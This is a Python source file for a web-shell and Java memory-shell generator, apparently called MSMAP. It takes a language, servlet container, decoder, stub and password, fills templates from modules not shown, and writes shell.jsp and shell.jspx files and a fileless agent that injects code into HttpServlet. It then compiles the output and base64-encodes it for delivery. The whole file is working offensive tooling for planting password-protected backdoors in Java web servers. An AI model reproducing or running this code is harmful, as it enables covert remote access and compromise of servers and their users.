#!/usr/bin/env python3

import base64
from importlib import import_module
import subprocess
import sys
from time import sleep

from config.dependency import *
from config.environment import *


LOGO = r"""
 _____ ______    ________   _____ ______    ________   ________
|\   _ \  _   \ |\   ____\ |\   _ \  _   \ |\   __  \ |\   __  \
\ \  \\\__\ \  \\ \  \___|_\ \  \\\__\ \  \\ \  \|\  \\ \  \|\  \
 \ \  \\|__| \  \\ \_____  \\ \  \\|__| \  \\ \   __  \\ \   ____\
  \ \  \    \ \  \\|____|\  \\ \  \    \ \  \\ \  \ \  \\ \  \___|
   \ \__\    \ \__\ ____\_\  \\ \__\    \ \__\\ \__\ \__\\ \__\
    \|__|     \|__||\_________\\|__|     \|__| \|__|\|__| \|__|
                   \|_________|
"""

def genscript(b64_str):
    jsp_dst = "target/shell.jsp"
    with open(jsp_dst, 'w') as f:
        f.write(JSP_PREFIX+b64_str+JSP_POSTFIX)
        print(f"            {jsp_dst}")

    jspx_dst = "target/shell.jspx"
    with open(jspx_dst, 'w') as f:
        f.write(JSPX_PREFIX+b64_str+JSPX_POSTFIX)
        print(f"            {jspx_dst}")

def b64file(file_name):
    with open(file_name, "rb") as fb:
        b64_str = base64.b64encode(fb.read()).decode("utf-8")

    if "javax" in file_name.lower():
        src_dst = 'target/AgentFileless.java'
        src = AGENTFILELESS.format(
            className="javax.servlet.http.HttpServlet", classBody=b64_str
        )
        with open(src_dst, 'w') as f:
            f.write(src)
            print(f"            {src_dst}")

        p = subprocess.Popen(
            f"{java_compiler_path} -cp {JAVA_LIB_PATH} {src_dst}",shell=True,
            stdout=subprocess.PIPE,stderr=subprocess.STDOUT
        )
        sleep(1)

        class_dst = f'target/AgentFileless.class'
        print(f"            {class_dst}")

        b64file(class_dst)
        return

    if generate_script and "spring" not in file_name.lower():
        genscript(b64_str)

    try:
        pyperclip = import_module("pyperclip")
        pyperclip.copy(b64_str)
        print(f"---\nBase64 copied to clipboard.")
    except ModuleNotFoundError:
        print(f"---\n{b64_str}")

def generator(options):
    language_name = options["language"].lower()
    container_name = options["container"].lower()
    model_name = options["model"].lower()
    decoder_name = options["decoder"].lower()
    stub_name = options["stub"].lower()
    password = options["password"]

    try:
        model = import_module(
            f"gist.{language_name}.container.{container_name}.{model_name}"
        )
        context = import_module(
            f"gist.{language_name}.container.{container_name}.context.util"
        )
        common = import_module(
            f"gist.{language_name}.common.util"
        )
        decoder = import_module(
            f"gist.{language_name}.decoder.{decoder_name}"
        )
        stub = import_module(
            f"gist.{language_name}.stub.{stub_name}"
        )
    except ModuleNotFoundError:
        sys.exit("Not supported currently, Check Your Input!")

    if model_name == "javax":
        src = model.code.format(
            decoder=decoder.proc, stub=stub.proc, password=password
        )
        src_dst = 'target/javax/servlet/http/HttpServlet.java'
    else:
        src = model.code.format(
            common=common.code, context=context.code, decoder=decoder.code,
            stub=stub.code, password=password
        )
        src_dst = f'target/{options["container"]}{options["model"]}.{language_name}'

    with open(src_dst, 'w') as f:
        f.write(src)

    print(
        f'\nOutputPath: {src_dst}'
    )

    if auto_build:
        compiler_path = eval(f"{language_name}_compiler_path")
        p = subprocess.Popen(
            f"{compiler_path} -cp {JAVA_LIB_PATH} {src_dst}",shell=True,
            stdout=subprocess.PIPE,stderr=subprocess.STDOUT
        )
        sleep(1)

        if model_name == "javax":
            class_dst = 'target/javax/servlet/http/HttpServlet.class'
        else:
            class_dst = f'target/{options["container"]}{options["model"]}.class'
        print(f"            {class_dst}")

        if b64_class:
            b64file(class_dst)

def get_menu(menu_dict):
    menu_str = ""
    for key in menu_dict:
        menu_str += f"[\033[92m{key}\033[0m] "
    return f"{menu_str}| [Back] > "

def main():
    argv = sys.argv
    next_menu_dict = MENU
    stack_menu_list = []
    options = {}
    depth = 1

    print(LOGO)

    if len(argv) > 6:
        options["language"] = argv[1]
        options["container"] = argv[2]
        options["model"] = argv[3]
        options["decoder"] = argv[4]
        options["stub"] = argv[5]
        options["password"] = argv[6]
        generator(options)
        sys.exit()

    while True:
        choice = input(get_menu(next_menu_dict)).strip()
        options[ARCH[depth]] = choice

        if not choice:
            continue
        elif choice in next_menu_dict:
            stack_menu_list.append(next_menu_dict)
            next_menu_dict = next_menu_dict[choice]
            depth += 1
        elif choice == "Back":
            if len(stack_menu_list) != 0:
                next_menu_dict = stack_menu_list.pop()
                depth -= 1
            else:
                sys.exit("Bye!")
        elif ARCH[depth] == "password":
            break

    generator(options)


if __name__ == "__main__":
    main()